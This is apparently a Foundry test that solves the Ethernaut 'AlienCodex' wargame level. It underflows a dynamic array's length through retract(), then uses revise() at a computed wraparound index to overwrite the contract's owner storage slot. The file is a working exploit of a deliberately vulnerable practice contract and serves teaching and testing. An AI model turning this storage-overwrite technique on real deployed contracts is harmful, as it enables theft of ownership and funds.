// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./BaseTest.sol";

contract AlienCodexTest is BaseTest {
    address alienCodexFactory;

    function setUp() public {
        address alienCodexFactoryMem;

        bytes memory factoryBytecode = abi.encodePacked(
            vm.getCode("./src/levels/AlienCodex/AlienCodex.json")
        );

        assembly {
            alienCodexFactoryMem := create(
                0,
                add(factoryBytecode, 0x20),
                mload(factoryBytecode)
            )
        }

        alienCodexFactory = alienCodexFactoryMem;

        super.setUp(Level(alienCodexFactory));
    }

    function testIsAlienCodexCleared()
        public
        testWrapper(Level(alienCodexFactory))
    {
        (bool makeContactSuccess, ) = instance.call(
            abi.encodeWithSignature("make_contact()")
        );
        require(makeContactSuccess, "make_contact() failed");

        (bool retractSuccess, ) = instance.call(
            abi.encodeWithSignature("retract()")
        );
        require(retractSuccess, "retract() failed");

        uint256 ownerIndex = type(uint256).max -
            uint256(keccak256(abi.encode(1))) +
            1;

        (bool reviseSuccess, ) = instance.call(
            abi.encodeWithSignature(
                "revise(uint256,bytes32)",
                ownerIndex,
                bytes32(abi.encode(eoa))
            )
        );
        require(reviseSuccess, "revise() failed");
    }
}
